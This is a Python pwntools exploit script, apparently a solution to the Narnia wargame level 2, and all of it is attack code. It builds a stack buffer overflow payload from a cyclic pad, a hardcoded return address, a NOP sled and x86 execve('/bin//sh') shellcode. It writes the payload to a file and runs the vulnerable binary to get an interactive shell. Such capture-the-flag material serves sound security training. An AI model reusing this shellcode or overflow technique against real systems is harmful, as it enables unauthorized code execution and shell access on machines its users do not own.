import os
from pwn import *

esp = 0xffffd878

payload = cyclic(132) + p32(esp) + "\x90"*90 + "\x83\xEC\x10\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\x31\xF6\x31\xFF\x31\xED\xB0\x0B\xCD\x80"

os.system("rm ./payload")
f = open("./payload","w")
f.write(payload)
f.close()

p = process(executable="/narnia/narnia2", argv=["", payload])
p.interactive()
